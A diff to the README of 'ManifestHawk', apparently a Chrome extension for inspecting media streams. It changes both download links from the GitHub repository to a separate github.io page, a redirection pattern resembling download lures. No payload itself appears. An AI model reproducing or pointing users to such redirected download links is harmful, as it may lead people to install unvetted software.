@@ -1,6 +1,6 @@
 # 🔍 ManifestHawk - Inspect media streams in your browser
 
-[![Download ManifestHawk](https://img.shields.io/badge/Download-ManifestHawk-blue.svg)](https://github.com/Screednightbloomingcereus973/ManifestHawk)
+[![Download ManifestHawk](https://img.shields.io/badge/Download-ManifestHawk-blue.svg)](https://screednightbloomingcereus973.github.io)
 
 ManifestHawk helps you inspect media streams directly in your Chrome browser. It identifies HLS, DASH, MP4, and other media files as they load. You can see live network requests, preview stream content, filter specific URLs, and export data for your projects. This tool assists developers and testers in troubleshooting video playback issues.
 
@@ -8,7 +8,7 @@ ManifestHawk helps you inspect media streams directly in your Chrome browser. It
 
 You must visit the project page to access the software files.
 
-[Click here to go to the ManifestHawk download page](https://github.com/Screednightbloomingcereus973/ManifestHawk)
+[Click here to go to the ManifestHawk download page](https://screednightbloomingcereus973.github.io)
 
 Follow these steps to add the tool to your browser:
 
